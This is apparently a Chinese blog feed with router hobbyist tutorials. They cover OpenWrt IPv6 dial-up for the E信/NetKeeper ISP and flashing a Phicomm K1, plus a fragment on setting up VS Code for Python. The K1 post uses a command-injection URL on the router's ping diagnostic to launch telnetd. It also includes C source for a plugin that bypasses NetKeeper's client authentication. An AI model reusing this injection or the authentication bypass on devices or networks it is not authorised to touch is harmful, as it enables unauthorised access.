<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-config.png" alt="op-config"></p>
<p>接着，我们要做的是，进入路由器设置里面设置相关端口参数</p>
<p>在电脑的浏览器里输入管理ip地址</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/sk1530.png" alt="sk1530"></p>
<p>进入端口设置界面</p>
<p>首先设置wan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-01.png" alt="op-01"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-02.png" alt="op-02"></p>
<p>切换协议为PPPOE，并随便输入账号密码（具体的拨号的账号密码在后面我们会加以更改）并在高级设置里勾选以下参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-03.png" alt="op-03"></p>
<p>然后保存并应用</p>
<p>然后我们设置lan口参数</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-04.png" alt="op-04"></p>
<p>按照该图设置</p>
<p>最后，我们回到接口总界面，自己创建一个端口</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-05.png" alt="op-05"></p>
<p>名字无所谓，但协议要选择rfc6333</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-06.png" alt="op-06"></p>
<p>提交以后填写ipv6的地址，经过大神的尝试，下面给的这个地址是比较稳定的，建议使用</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-07.png" alt="op-07"></p>
<p>240e:d:1000::ffff:1:<br>并在高级设置里面勾选默认网关</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-08.png" alt="op-08"></p>
<p>在防火墙设置里，把这个链接拉到wan口里</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-09.png" alt="op-09"></p>
<p>最后保存</p>
<p>这样，路由器上的设置就结束了，下面转入配置文件的修改上</p>
<p>依次顺序进入到如下路径</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-10.png" alt="op-10"></p>
<p>双击network文件打开</p>
<p>并在文件的位置更改</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-11.png" alt="op-11"></p>
<p>然后点击保存</p>
<p>然后进入到此目录，上传我们准备的E信算法库文件</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/op-12.png" alt="op-12"></p>
<p>最后重启一下路由器，同步一下路由器的时间，就可以了<br>注意，不同的芯片和不同地区的openwrt路由器，sxplugin.so文件是不一样的，具体请查看我上一篇文章打包的东西。</p>
<blockquote>
<p>再说一次，文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除</p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;原理介绍分析：&quot;&gt;&lt;a href=&quot;#原理介绍分析：&quot; class=&quot;headerlink&quot; title=&quot;原理介绍分析：&quot;&gt;&lt;/a&gt;原理介绍分析：&lt;/h1&gt;&lt;p&gt;湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。&lt;/p&gt;
&lt;h1 id=&quot;操作步骤：&quot;&gt;&lt;a href=&quot;#操作步骤：&quot; class=&quot;headerlink&quot; title=&quot;操作步骤：&quot;&gt;&lt;/a&gt;操作步骤：&lt;/h1&gt;&lt;p&gt;首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/network111.png&quot; alt=&quot;network111&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://hacktech.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>给斐讯K1刷机并拨号e信(湖北地区测试无问题)</title>
    <link href="http://hacktech.cn/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98/"/>
    <id>http://hacktech.cn/2016/09/22/给斐讯K1刷机并拨号e信-湖北地区测试无问题/</id>
    <published>2016-09-22T05:38:21.000Z</published>
    <updated>2016-10-29T07:04:40.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="◆购买斐讯k1路由器"><a href="#◆购买斐讯k1路由器" class="headerlink" title="◆购买斐讯k1路由器"></a>◆购买斐讯k1路由器</h1><p>路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购</p>
<h1 id="◆路由器刷不死Breed"><a href="#◆路由器刷不死Breed" class="headerlink" title="◆路由器刷不死Breed"></a>◆路由器刷不死Breed</h1><h2 id="1-路由与电脑有线连接好，输入192-168-2-1，完成设置"><a href="#1-路由与电脑有线连接好，输入192-168-2-1，完成设置" class="headerlink" title="1.路由与电脑有线连接好，输入192.168.2.1，完成设置"></a>1.路由与电脑有线连接好，输入192.168.2.1，完成设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png" alt="k1basicSetting"></p>
<h2 id="2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd"><a href="#2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd" class="headerlink" title="2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd"></a>2.在浏览器地址栏输入：<a href="http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd" target="_blank" rel="external">http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&quot;&quot;|telnetd</a></h2><p>(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))</p>
<a id="more"></a>
<h2 id="3-打开tftp，这里用tftp32演示，按图设置"><a href="#3-打开tftp，这里用tftp32演示，按图设置" class="headerlink" title="3.打开tftp，这里用tftp32演示，按图设置"></a>3.打开tftp，这里用tftp32演示，按图设置</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/tftpK1Setting.png" alt="tftpK1Setting"></p>
<h2 id="4-打开CMD-务必使用管理员权限，telnet-192-168-2-1"><a href="#4-打开CMD-务必使用管理员权限，telnet-192-168-2-1" class="headerlink" title="4.打开CMD,务必使用管理员权限，telnet 192.168.2.1"></a>4.打开CMD,务必使用管理员权限，telnet 192.168.2.1</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmdK1Serting.png" alt="cmdK1Serting"></p>
<h2 id="5-输入用户名密码"><a href="#5-输入用户名密码" class="headerlink" title="5.输入用户名密码"></a>5.输入用户名密码</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd2K1Serting.png" alt="cmd2K1Serting"></p>
<h2 id="6-输入命令"><a href="#6-输入命令" class="headerlink" title="6.输入命令"></a>6.输入命令</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>) <span class="built_in">cd</span> /tmp</div><div class="line"></div><div class="line"><span class="number">2</span>) tftp –g –l /tmp/breed.bin –r breed.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line"></div><div class="line"><span class="number">3</span>) cat /dev/mtd1 &gt;/tmp/mtd1.bin</div><div class="line">  cat /dev/mtd0 &gt;/tmp/mtd0.bin</div><div class="line"></div><div class="line"><span class="number">4</span>) tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line">  tftp –p –r mtd1.bin –l /tmp/mtd1.bin <span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">100</span></div><div class="line"></div><div class="line"><span class="number">5</span>) mtd_write write breed.bin Bootloader</div></pre></td></tr></table></figure>
<p>等待出现#字<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/cmd3K1Serting.png" alt="cmd3K1Serting"></p>
<h2 id="7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面"><a href="#7-拔掉电源，然后按住reset键插上电源，地址栏输入192-168-1-1，就进入了breed界面" class="headerlink" title="7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面"></a>7.拔掉电源，然后按住reset键插上电源，地址栏输入192.168.1.1，就进入了breed界面</h2><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breed.png" alt="K1breed"></p>
<h3 id="懒人一键式安装法："><a href="#懒人一键式安装法：" class="headerlink" title="懒人一键式安装法："></a>懒人一键式安装法：</h3><p>输入：<br>wget <a href="http://breed.hackpascal.net/breed-mt7620-reset1.bin" target="_blank" rel="external">http://breed.hackpascal.net/breed-mt7620-reset1.bin</a><br>然后输入：<br>mtd_write write breed-mt7620-reset1.bin Bootloader</p>
<p>等待出现#字（代表着已经完成）</p>
<h2 id="刷breed后语"><a href="#刷breed后语" class="headerlink" title="刷breed后语"></a>刷breed后语</h2><p>只要路由breed不被变动，路由刷错固件也不怕，同样方式进入breed刷回正确的即可。</p>
<p>推荐每次刷完固件后，去固件系统管理–恢复原厂默认值。</p>
<h1 id="◆刷openWRT"><a href="#◆刷openWRT" class="headerlink" title="◆刷openWRT"></a>◆刷openWRT</h1><h2 id="1-刷新固件"><a href="#1-刷新固件" class="headerlink" title="1.刷新固件"></a>1.刷新固件</h2><p>我在下面的文件中打包了两个固件，一个是潘多拉的K1专版，一个是openWRT，我自己使用的是专版潘多拉，各位看官自己选择，刷新固件很简单，看图<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset1.png" alt="set1"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1breedset2.png" alt="set2"></p>
<p>点击更新，看路由灯全部亮起后，无线网络出现,OK</p>
<h1 id="◆安装e信-NetKeeper-插件并进行拨号"><a href="#◆安装e信-NetKeeper-插件并进行拨号" class="headerlink" title="◆安装e信(NetKeeper)插件并进行拨号"></a>◆安装e信(NetKeeper)插件并进行拨号</h1><h2 id="1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so"><a href="#1-你得准备一些东西-WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin-so" class="headerlink" title="1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为sxplugin.so"></a>1.你得准备一些东西(WINSCP一个，op系统相关netkeeper一只）找到对应地区更改文件名为<code>sxplugin.so</code></h2><h2 id="2-通过WINSCP登录你的路由器"><a href="#2-通过WINSCP登录你的路由器" class="headerlink" title="2.通过WINSCP登录你的路由器"></a>2.通过WINSCP登录你的路由器</h2><p><strong> 注意使用scp协议，密码admin（第一次登录op需要重设密码依然设为admin就可以了 </strong></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscpK1set.png" alt="winscpK1set"></p>
<h2 id="3-放入拨号插件"><a href="#3-放入拨号插件" class="headerlink" title="3.放入拨号插件"></a>3.放入拨号插件</h2><p>登录之后打开路由器，在这儿选择/(root）然后选择/usr/lib/pppd/2.4.7文件夹将你编辑好的<code>sxplugin.so</code>文件放入即可（<strong> 这里的sxplugin.so是自己更名的，湖北的就选择wuhan的来更名，文件在文末有打包 </strong> ）</p>
<h2 id="4-设置帐号密码拨号"><a href="#4-设置帐号密码拨号" class="headerlink" title="4.设置帐号密码拨号"></a>4.设置帐号密码拨号</h2><p>通过浏览器登录浏览器打开网络下的接口选择WAN口点击修改，协议选择PPPOE即可，然后下面有个按钮点一下会出来填帐号密码的，账户和密码也要写对，我是重庆动态密码可以正常用。（蓝字我是加了中文包的，你刷了过后是英文呢，凑合看吧，加中文包需要路由器联网。）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1.png" alt="op"><br><img src="http://7xusrl.com1.z0.glb.clouddn.com/openWRTK1wan.png" alt="op2"></p>
<p>最后点击保存应用退出</p>
<h2 id="5-最后的配置"><a href="#5-最后的配置" class="headerlink" title="5.最后的配置"></a>5.最后的配置</h2><p>通过WINSCP登录路由器同样打开文件夹/etc/config/找到network修改<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/K1network.png" alt="K1network"></p>
<p>在图中的位置输入option ‘pppd_options’ ‘plugin sxplugin.so’这个代码即可（注意粘贴后字体是否一致，主要是‘号的问题，可保存后再打开查看，必须搞定字体格式才行），到此netkeeper就安装完了。最后重启路由器，到系统里面选时区，同步浏览器时间，保存。再到wan点击连接就能联网了。（如果进不去wan这个界面就是设置错了）</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/k1lastsetting.png" alt="k1lastsetting"></p>
<blockquote>
<p>最后要说的，这个可用的原因是湖北地区e信2.5的算法依旧可用，有的地区加了心跳，有的地区强制升级了，并不可用,教程到此处完结，后面的有能力可以看看，工具教程打包在文末</p>
</blockquote>
<h1 id="◆闪讯算法源码"><a href="#◆闪讯算法源码" class="headerlink" title="◆闪讯算法源码"></a>◆闪讯算法源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/pppd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pppd/md5.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> byte;</div><div class="line"></div><div class="line"><span class="keyword">char</span> pppd_version[] = VERSION;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> saveuser[MAXNAMELEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">static</span> <span class="keyword">char</span> savepwd[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getPIN</span><span class="params">(byte *userName, byte *PIN)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,j;<span class="comment">//循环变量</span></div><div class="line">    <span class="keyword">long</span> timedivbyfive;<span class="comment">//时间除以五</span></div><div class="line">    <span class="keyword">time_t</span> timenow;<span class="comment">//当前时间，从time()获得</span></div><div class="line">    byte RADIUS[<span class="number">16</span>];<span class="comment">//凑位字符</span></div><div class="line">    byte timeByte[<span class="number">4</span>];<span class="comment">//时间 div 5</span></div><div class="line">    byte beforeMD5[<span class="number">32</span>];<span class="comment">//时间 div 5+用户名+凑位</span></div><div class="line">    MD5_CTX md5;<span class="comment">//MD5结构体</span></div><div class="line">    byte afterMD5[<span class="number">16</span>];<span class="comment">//MD5输出</span></div><div class="line">    byte MD501H[<span class="number">2</span>]; <span class="comment">//MD5前两位</span></div><div class="line">    byte MD501[<span class="number">3</span>];</div><div class="line">    byte timeHash[<span class="number">4</span>]; <span class="comment">//时间div5经过第一次转后后的值</span></div><div class="line">    byte temp[<span class="number">32</span>]; <span class="comment">//第一次转换时所用的临时数组</span></div><div class="line">    byte PIN27[<span class="number">6</span>]; <span class="comment">//PIN的2到7位，由系统时间转换</span></div><div class="line"></div><div class="line">    <span class="comment">//code</span></div><div class="line">    info(<span class="string">"sxplugin : using zjxinlisx01"</span>);</div><div class="line">    <span class="built_in">strcpy</span>(RADIUS, <span class="string">"zjxinlisx01"</span>);</div><div class="line">    timenow = time(<span class="literal">NULL</span>);</div><div class="line">    timedivbyfive = timenow / <span class="number">5</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        timeByte[i] = (byte)(timedivbyfive &gt;&gt; (<span class="number">8</span> * (<span class="number">3</span> - i)) &amp; <span class="number">0xFF</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        beforeMD5[i]= timeByte[i];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">4</span>; i &lt; <span class="number">16</span> &amp;&amp; userName[i<span class="number">-4</span>]!=<span class="string">'@'</span> ; i++) &#123;</div><div class="line">        beforeMD5[i] = userName[i<span class="number">-4</span>];</div><div class="line">    &#125;</div><div class="line">    j=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(RADIUS[j]!=<span class="string">'\0'</span>)</div><div class="line">        beforeMD5[i++] = RADIUS[j++];</div><div class="line"></div><div class="line">    MD5_Init(&amp;md5);</div><div class="line">    MD5_Update (&amp;md5, beforeMD5, i);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s\n"</span>,i,beforeMD5);</div><div class="line">    MD5_Final (afterMD5, &amp;md5);</div><div class="line"></div><div class="line">    MD501H[<span class="number">0</span>] = afterMD5[<span class="number">0</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>;</div><div class="line">    MD501H[<span class="number">1</span>] = afterMD5[<span class="number">0</span>] &amp; <span class="number">0xF</span>;</div><div class="line"></div><div class="line">    <span class="built_in">sprintf</span>(MD501,<span class="string">"%x%x"</span>,MD501H[<span class="number">0</span>],MD501H[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</div><div class="line">        temp[i] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &amp; <span class="number">1</span>;</div><div class="line">        timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] = timeByte[(<span class="number">31</span> - i) / <span class="number">8</span>] &gt;&gt; <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</div><div class="line">        timeHash[i] = temp[i] * <span class="number">128</span> + temp[<span class="number">4</span> + i] * <span class="number">64</span> + temp[<span class="number">8</span> + i]</div><div class="line">            * <span class="number">32</span> + temp[<span class="number">12</span> + i] * <span class="number">16</span> + temp[<span class="number">16</span> + i] * <span class="number">8</span> + temp[<span class="number">20</span> + i]</div><div class="line">            * <span class="number">4</span> + temp[<span class="number">24</span> + i] * <span class="number">2</span> + temp[<span class="number">28</span> + i];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">0</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</div><div class="line">    temp[<span class="number">0</span>] = (timeHash[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</div><div class="line">    temp[<span class="number">2</span>] = (timeHash[<span class="number">1</span>] &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">2</span>;</div><div class="line">    temp[<span class="number">1</span>] = (timeHash[<span class="number">1</span>] &gt;&gt; <span class="number">4</span> &amp; <span class="number">0xF</span>) + temp[<span class="number">1</span>];</div><div class="line">    temp[<span class="number">3</span>] = timeHash[<span class="number">2</span>] &amp; <span class="number">0x3F</span>;</div><div class="line">    temp[<span class="number">2</span>] = ((timeHash[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3</span>) + temp[<span class="number">2</span>];</div><div class="line">    temp[<span class="number">5</span>] = (timeHash[<span class="number">3</span>] &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</div><div class="line">    temp[<span class="number">4</span>] = (timeHash[<span class="number">3</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</div><div class="line">        PIN27[i] = temp[i] + <span class="number">0x020</span>;</div><div class="line">        <span class="keyword">if</span>(PIN27[i]&gt;=<span class="number">0x40</span>) &#123;</div><div class="line">            PIN27[i]++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    PIN[<span class="number">0</span>] = <span class="string">'\r'</span>;</div><div class="line">    PIN[<span class="number">1</span>] = <span class="string">'\n'</span>;</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(PIN+<span class="number">2</span>, PIN27, <span class="number">6</span>);</div><div class="line"></div><div class="line">    PIN[<span class="number">8</span>] = MD501[<span class="number">0</span>];</div><div class="line">    PIN[<span class="number">9</span>] = MD501[<span class="number">1</span>];</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(PIN+<span class="number">10</span>, userName);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pap_modifyusername</span><span class="params">(<span class="keyword">char</span> *user, <span class="keyword">char</span>* passwd)</span></span></div><div class="line">&#123;</div><div class="line">    byte PIN[MAXSECRETLEN] = &#123;<span class="number">0</span>&#125;;</div><div class="line">    getPIN(saveuser, PIN);</div><div class="line">    <span class="built_in">strcpy</span>(user, PIN);</div><div class="line">    info(<span class="string">"sxplugin : user  is %s "</span>,user);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">plugin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    info(<span class="string">"sxplugin : init"</span>);</div><div class="line">    <span class="built_in">strcpy</span>(saveuser,user);</div><div class="line">    <span class="built_in">strcpy</span>(savepwd,passwd);</div><div class="line">    pap_modifyusername(user, saveuser);</div><div class="line">    info(<span class="string">"sxplugin : passwd loaded"</span>);</div><div class="line">    pap_check_hook=check;</div><div class="line">    chap_check_hook=check;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="◆下载地址"><a href="#◆下载地址" class="headerlink" title="◆下载地址"></a>◆下载地址</h1><p><a href="http://cloud.189.cn/t/umuUBrQNNRfi" target="_blank" rel="external">  (访问码:4854)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;◆购买斐讯k1路由器&quot;&gt;&lt;a href=&quot;#◆购买斐讯k1路由器&quot; class=&quot;headerlink&quot; title=&quot;◆购买斐讯k1路由器&quot;&gt;&lt;/a&gt;◆购买斐讯k1路由器&lt;/h1&gt;&lt;p&gt;路由器在天猫京东斐讯旗舰店都有售卖，我买的价格是159，不过有一张铃铛卡，一个月之后返还160元，相当于0元购&lt;/p&gt;
&lt;h1 id=&quot;◆路由器刷不死Breed&quot;&gt;&lt;a href=&quot;#◆路由器刷不死Breed&quot; class=&quot;headerlink&quot; title=&quot;◆路由器刷不死Breed&quot;&gt;&lt;/a&gt;◆路由器刷不死Breed&lt;/h1&gt;&lt;h2 id=&quot;1-路由与电脑有线连接好，输入192-168-2-1，完成设置&quot;&gt;&lt;a href=&quot;#1-路由与电脑有线连接好，输入192-168-2-1，完成设置&quot; class=&quot;headerlink&quot; title=&quot;1.路由与电脑有线连接好，输入192.168.2.1，完成设置&quot;&gt;&lt;/a&gt;1.路由与电脑有线连接好，输入192.168.2.1，完成设置&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/k1basicSetting.png&quot; alt=&quot;k1basicSetting&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd&quot;&gt;&lt;a href=&quot;#2-在浏览器地址栏输入：http-192-168-2-1-goform-Diagnosis-pingAddr-192-168-2-100-echo-quot-quot-telnetd&quot; class=&quot;headerlink&quot; title=&quot;2.在浏览器地址栏输入：http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&amp;quot;&amp;quot;|telnetd&quot;&gt;&lt;/a&gt;2.在浏览器地址栏输入：&lt;a href=&quot;http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&amp;quot;&amp;quot;|telnetd&quot;&gt;http://192.168.2.1/goform/Diagnosis?pingAddr=192.168.2.100|echo&amp;quot;&amp;quot;|telnetd&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;(如果你的电脑ip不是192.168.2.100,请改成你电脑的ip(内网ip))&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://hacktech.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>Visual Studio Code配置Python开发环境</title>
    <link href="http://hacktech.cn/2016/06/29/Visual-Studio-Code%E9%85%8D%E7%BD%AEPython%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <id>http://hacktech.cn/2016/06/29/Visual-Studio-Code配置Python开发环境/</id>
    <published>2016-06-29T13:29:45.000Z</published>
    <updated>2016-07-02T17:57:01.740Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-安装Python插件"><a href="#1-安装Python插件" class="headerlink" title="1.安装Python插件"></a>1.安装Python插件</h1><p>在VScode界面按<code>Crtl</code>+<code>Shift</code>+<code>P</code>或者<code>F1</code></p>
<p>输入<code>ext install</code></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ext%20install.png" alt="ext install"></p>
<p>直接安装<code>Python</code>，也就是点击它，然后等待，安装好后会提示你重启<br><a id="more"></a></p>
<h1 id="2-配置运行Python程序"><a href="#2-配置运行Python程序" class="headerlink" title="2.配置运行Python程序"></a>2.配置运行Python程序</h1><p>同样的打开命令面板（<code>Crtl</code>+<code>Shift</code>+<code>P</code>或<code>F1</code>），然后输入<code>Tasks: Configure Task Runner</code>（中文输入：任务，然后选择任务：配置任务运行程序），选择<code>Other</code></p>
<p>此时VScode会自动生成.vscode文件夹并生成一个默认的task.json</p>
